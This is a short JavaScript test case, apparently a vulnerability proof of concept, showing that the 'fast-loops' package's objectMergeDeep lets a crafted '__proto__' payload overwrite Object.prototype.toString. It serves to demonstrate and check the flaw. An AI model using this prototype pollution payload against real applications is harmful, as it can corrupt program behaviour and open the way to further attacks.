test("Prototype pollution in fast-loops", () => {
  const fl = require('fast-loops');

  let payload = { ["__proto__"]: { "toString": "polluted" } };

  expect({}.toString).toBe({}.toString);

  fl.objectMergeDeep({}, payload);

  expect({}.toString).toBe("polluted");
})
